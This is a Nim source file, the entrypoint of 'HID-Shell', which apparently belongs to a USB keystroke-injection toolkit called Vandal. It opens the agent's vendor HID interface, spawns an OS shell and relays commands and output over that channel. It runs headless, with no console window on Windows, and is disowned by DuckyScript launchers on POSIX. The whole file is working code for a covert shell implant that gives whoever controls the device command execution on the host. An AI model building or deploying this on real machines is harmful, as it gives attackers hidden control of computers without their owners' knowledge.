## HID-Shell entrypoint. Connects to the Vandal agent's vendor HID
## interface, spawns a persistent OS shell, and pumps bytes between
## them until the agent says BYE, the device disappears, or the user
## kills the process.
##
## Headless by default: on Windows the binary is compiled with
## `--app:gui` so no console window appears; on POSIX the launcher
## DuckyScripts disown the process. Pass `--debug` to log to stderr.

import std/[os, options, osproc, parseopt, strutils]
import ./transport_hid, ./shell_child, ./pump

proc usage() =
  stderr.writeLine "usage: hid_shell [--debug] [--once] [--wait-ms N]"

proc main() =
  var debugEnabled = false
  var once = false
  var waitMs = 10_000

  for kind, key, val in getopt():
    case kind
    of cmdShortOption, cmdLongOption:
      case key
      of "h", "help":
        usage(); return
      of "debug":
        debugEnabled = true
      of "once":
        once = true
      of "wait-ms":
        waitMs = parseInt(val)
      else:
        stderr.writeLine "unknown option: " & key
        usage(); quit 2
    of cmdArgument:
      stderr.writeLine "unexpected argument: " & key
      usage(); quit 2
    of cmdEnd: break

  let logger = if debugEnabled:
    proc(msg: string) = stderr.writeLine "[hid-shell] " & msg
  else:
    nil

  if logger != nil: logger("starting; waiting up to " & $waitMs & " ms for device")

  let linkOpt = waitForDevice(
    maxAttempts = max(1, waitMs div 200),
    intervalMs = 200
  )
  if linkOpt.isNone:
    if logger != nil: logger("Vandal vendor HID not found, exiting")
    quit 3
  let link = linkOpt.get
  if logger != nil:
    logger("opened device " & link.path & " (VID:PID " &
           toHex(link.vid, 4) & ":" & toHex(link.pid, 4) & ")")

  while true:
    let child = spawnShell()
    if logger != nil:
      when defined(windows):
        logger("spawned shell pid=" & $child.process.processID())
      else:
        logger("spawned shell pid=" & $child.pid)

    try:
      runPump(link, child, logger)
    finally:
      child.terminate()
      if logger != nil: logger("shell exited")

    if once:
      break
    # The agent may have sent BYE for this command session. In v1 the
    # session is one-shot per payload run: exit so the next click in
    # the UI relaunches a fresh process. (Future: respect a `--reattach`
    # flag for persistent attendance.)
    break

  link.close()
  if logger != nil: logger("bye")

when isMainModule:
  main()
